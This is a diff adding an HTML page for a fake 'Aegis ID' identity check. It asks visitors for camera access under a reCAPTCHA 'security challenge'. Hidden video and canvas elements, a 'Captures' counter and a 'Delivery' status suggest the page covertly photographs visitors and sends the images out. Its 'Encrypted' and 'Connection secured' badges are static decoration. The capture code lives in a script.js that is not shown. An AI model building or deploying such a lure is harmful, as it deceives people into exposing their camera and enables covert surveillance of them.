@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aegis ID — Verifying…</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+<!-- reCAPTCHA -->
+<script>
+  window.__recaptchaReady = false;
+  window.__cameraReady    = false;
+  window.onRecaptchaLoad = function () {
+    window.__recaptchaReady = true;
+    if (window.__tryRenderRecaptcha) window.__tryRenderRecaptcha();
+  };
+</script>
+<script src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaLoad&render=explicit" async defer></script>
+
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  :root{
+    --ink:#e6edf7;
+    --muted:#7d8ea8;
+    --bg:#050914;
+    --panel:#0b1220;
+    --line:rgba(148,163,184,0.10);
+    --teal:#14b8a6;
+    --cyan:#06b6d4;
+    --violet:#8b5cf6;
+    --amber:#fbbf24;
+    --rose:#fb7185;
+  }
+  html,body{height:100%;}
+  body{
+    font-family:'Inter',system-ui,sans-serif;
+    background:
+      radial-gradient(900px 500px at 90% -5%, rgba(20,184,166,0.16), transparent 55%),
+      radial-gradient(700px 400px at 0% 100%, rgba(139,92,246,0.14), transparent 55%),
+      var(--bg);
+    color:var(--ink);
+    min-height:100vh;
+    display:flex; flex-direction:column;
+    align-items:center; justify-content:space-between;
+    padding:0;
+  }
+
+  /* ---- top ---- */
+  .verify-top{
+    width:100%;
+    padding:18px 40px;
+    display:flex; align-items:center; justify-content:space-between;
+    border-bottom:1px solid var(--line);
+    backdrop-filter:blur(8px);
+    background:rgba(5,9,20,0.55);
+    position:sticky; top:0; z-index:10;
+  }
+  .brandmark{
+    display:flex; align-items:center; gap:11px;
+    font-family:'Space Grotesk',sans-serif;
+    font-weight:700; font-size:16px;
+  }
+  .shield{
+    width:32px; height:32px;
+    display:flex; align-items:center; justify-content:center;
+    border-radius:10px;
+    background:linear-gradient(135deg,var(--teal),var(--cyan));
+    box-shadow:0 8px 20px rgba(20,184,166,0.35);
+    color:#04121a;
+  }
+  .shield svg{width:18px;height:18px;}
+
+  .top-meta{
+    display:flex; gap:16px; align-items:center;
+    font-size:12.5px; color:var(--muted);
+    font-family:'Space Grotesk',sans-serif;
+  }
+  .tag{
+    padding:4px 11px; border-radius:999px;
+    font-size:11px; font-weight:600;
+    background:rgba(20,184,166,0.10);
+    color:var(--teal);
+    border:1px solid rgba(20,184,166,0.25);
+    letter-spacing:.3px;
+  }
+
+  /* ---- main ---- */
+  .stage{
+    flex:1;
+    width:100%; max-width:640px;
+    padding:48px 22px;
+    display:flex; align-items:center; justify-content:center;
+  }
+  .panel{
+    width:100%;
+    border-radius:24px;
+    background:linear-gradient(180deg, rgba(255,255,255,0.035), rgba(255,255,255,0.01));
+    border:1px solid var(--line);
+    backdrop-filter:blur(16px);
+    box-shadow:0 40px 80px rgba(0,0,0,0.55), inset 0 1px 0 rgba(255,255,255,0.05);
+    overflow:hidden;
+  }
+  .panel-head{
+    padding:34px 36px 26px;
+    border-bottom:1px solid var(--line);
+    background:linear-gradient(135deg, rgba(20,184,166,0.08), rgba(139,92,246,0.05));
+    text-align:center;
+  }
+  .panel-head .eyebrow{
+    display:inline-flex; align-items:center; gap:8px;
+    font-size:11px; font-weight:600; letter-spacing:.5px;
+    color:var(--teal);
+    padding:5px 13px; border-radius:999px;
+    background:rgba(20,184,166,0.10);
+    border:1px solid rgba(20,184,166,0.25);
+    text-transform:uppercase;
+  }
+  .panel-head .eyebrow .dot{
+    width:6px;height:6px;border-radius:50%;background:var(--teal);
+    box-shadow:0 0 8px var(--teal);
+    animation:blink 1.3s infinite;
+  }
+  @keyframes blink{0%,100%{opacity:1;}50%{opacity:.3;}}
+
+  .panel-head h1{
+    font-family:'Space Grotesk',sans-serif;
+    font-size:24px; font-weight:700; letter-spacing:-0.6px;
+    margin:16px 0 8px;
+  }
+  .panel-head p{
+    font-size:13.5px; color:var(--muted); line-height:1.55;
+    max-width:400px; margin:0 auto;
+  }
+
+  /* ---- steps indicator ---- */
+  .steps{
+    display:flex; justify-content:center; gap:0;
+    padding:22px 36px 0;
+  }
+  .step-dot{
+    flex:1; position:relative;
+    display:flex; flex-direction:column; align-items:center; gap:8px;
+    font-size:10.5px; color:var(--muted);
+    font-family:'Space Grotesk',sans-serif;
+    letter-spacing:.5px; text-transform:uppercase; font-weight:600;
+  }
+  .step-dot::before{
+    content:""; position:absolute;
+    top:11px; left:-50%; right:50%;
+    height:2px; background:var(--line);
+  }
+  .step-dot:first-child::before{display:none;}
+  .step-dot .bubble{
+    width:22px;height:22px;border-radius:50%;
+    border:2px solid var(--line);
+    background:var(--panel);
+    display:flex; align-items:center; justify-content:center;
+    z-index:1;
+    transition:all .3s;
+  }
+  .step-dot.done .bubble{
+    background:linear-gradient(135deg,var(--teal),var(--cyan));
+    border-color:transparent;
+    box-shadow:0 0 14px rgba(20,184,166,0.55);
+    color:#04121a; font-weight:700; font-size:11px;
+  }
+  .step-dot.done{ color:var(--teal); }
+  .step-dot.active .bubble{
+    border-color:var(--amber);
+    background:rgba(251,191,36,0.12);
+    box-shadow:0 0 14px rgba(251,191,36,0.35);
+  }
+  .step-dot.active{ color:var(--amber); }
+
+  /* ---- body ---- */
+  .panel-body{
+    padding:28px 36px 36px;
+    text-align:center;
+  }
+
+  /* camera card */
+  .cam-card{
+    padding:26px 20px;
+    border-radius:16px;
+    border:1px solid var(--line);
+    background:rgba(148,163,184,0.03);
+    margin-bottom:22px;
+    transition:all .35s ease;
+  }
+  .cam-card.active{
+    border-color:rgba(20,184,166,0.4);
+    background:rgba(20,184,166,0.05);
+    box-shadow:0 0 40px rgba(20,184,166,0.12) inset;
+  }
+  .cam-icon{
+    font-size:38px; line-height:1;
+    filter:drop-shadow(0 0 16px rgba(20,184,166,0.5));
+  }
+  .cam-title{
+    font-family:'Space Grotesk',sans-serif;
+    font-size:15px; font-weight:600; margin-top:10px;
+  }
+  .cam-sub{
+    font-size:12.5px; color:var(--muted); margin-top:5px;
+  }
+
+  /* live stats strip */
+  .stat-strip{
+    display:none; justify-content:center; gap:14px; flex-wrap:wrap;
+    margin-bottom:22px;
+  }
+  .stat{
+    flex:1; min-width:110px;
+    padding:14px 16px;
+    border-radius:14px;
+    border:1px solid var(--line);
+    background:rgba(148,163,184,0.04);
+    text-align:left;
+  }
+  .stat .v{
+    font-family:'Space Grotesk',sans-serif;
+    font-size:24px; font-weight:700; letter-spacing:-0.4px;
+    color:var(--teal);
+  }
+  .stat .v.ok{ color:var(--teal); }
+  .stat .l{
+    font-size:10.5px; color:var(--muted);
+    letter-spacing:.5px; text-transform:uppercase;
+    margin-top:3px; font-weight:600;
+  }
+
+  /* recaptcha */
+  #recapWrap{
+    display:flex; justify-content:center;
+    padding:4px 0 6px;
+    transition:opacity .35s;
+  }
+  #recaptchaWidget{ display:inline-block; }
+  .dimmed{ opacity:.35; pointer-events:none; filter:grayscale(.4); }
+
+  .legal-line{
+    font-size:11px; color:var(--muted);
+    margin-top:14px; line-height:1.5;
+  }
+
+  /* progress bar under captcha */
+  .live-progress{
+    display:none;
+    margin-top:18px;
+    height:4px; border-radius:4px;
+    background:rgba(148,163,184,0.10);
+    overflow:hidden;
+  }
+  .live-progress span{
+    display:block; height:100%; width:30%;
+    background:linear-gradient(90deg,var(--teal),var(--cyan));
+    animation:slide 2.2s ease-in-out infinite;
+    box-shadow:0 0 12px rgba(20,184,166,0.6);
+  }
+  @keyframes slide{
+    0%,100%{transform:translateX(-30%);}
+    50%{transform:translateX(230%);}
+  }
+
+  /* ---- bottom ---- */
+  .verify-bottom{
+    width:100%;
+    padding:14px 40px;
+    border-top:1px solid var(--line);
+    display:flex; justify-content:space-between; align-items:center;
+    font-size:11.5px; color:var(--muted);
+    background:rgba(5,9,20,0.55);
+    font-family:'Space Grotesk',sans-serif;
+    letter-spacing:.2px;
+  }
+  #bottomRight{ color:var(--teal); }
+
+  video, canvas { display:none; }
+
+  @media (max-width:480px){
+    .panel-head{ padding:26px 22px 20px; }
+    .panel-body{ padding:22px 20px 26px; }
+    .verify-top{ padding:14px 20px; }
+    .verify-bottom{ padding:12px 20px; }
+    .panel-head h1{ font-size:20px; }
+    .step-dot{ font-size:9.5px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="verify-top">
+  <div class="brandmark">
+    <span class="shield">
+      <svg viewBox="0 0 24 24" fill="none">
+        <path d="M12 3l7 3v6c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6l7-3z"
+              stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+        <path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="2"
+              stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </span>
+    <span>Aegis <span style="color:var(--muted);font-weight:500;">ID</span></span>
+  </div>
+  <div class="top-meta">
+    <span class="tag">● Encrypted</span>
+    <span>Session <span id="sessId" style="color:var(--ink);font-weight:600;">—</span></span>
+  </div>
+</div>
+
+<div class="stage">
+  <div class="panel">
+    <div class="panel-head">
+      <div class="eyebrow"><span class="dot"></span> Security Challenge</div>
+      <h1>Confirm it's really you</h1>
+      <p>Complete two quick steps — a one-tap camera check and a
+         human-verification challenge.</p>
+
+      <div class="steps">
+        <div class="step-dot active" id="sd1">
+          <div class="bubble">1</div>
+          Camera check
+        </div>
+        <div class="step-dot" id="sd2">
+          <div class="bubble">2</div>
+          Human test
+        </div>
+        <div class="step-dot" id="sd3">
+          <div class="bubble">3</div>
+          Access
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-body">
+
+      <!-- camera card -->
+      <div class="cam-card" id="camCard">
+        <div class="cam-icon">📷</div>
+        <div class="cam-title" id="camTitle">Requesting camera access…</div>
+        <div class="cam-sub" id="camSub">Tap "Allow" to begin your check.</div>
+      </div>
+
+      <!-- live stats -->
+      <div class="stat-strip" id="statStrip">
+        <div class="stat">
+          <div class="v" id="cntCaptures">0</div>
+          <div class="l">Captures</div>
+        </div>
+        <div class="stat">
+          <div class="v ok" id="delStatus">✓</div>
+          <div class="l">Delivery</div>
+        </div>
+      </div>
+
+      <!-- reCAPTCHA -->
+      <div id="recapWrap" class="dimmed">
+        <div id="recaptchaWidget"></div>
+      </div>
+
+      <div class="live-progress" id="liveProgress"><span></span></div>
+
+      <div class="legal-line">
+        Protected by reCAPTCHA · Privacy Policy · Terms of Service
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="verify-bottom">
+  <span>Status: <span id="diag">idle</span></span>
+  <span id="bottomRight">● Connection secured</span>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script type="module" src="script.js"></script>
+</body>
+</html>
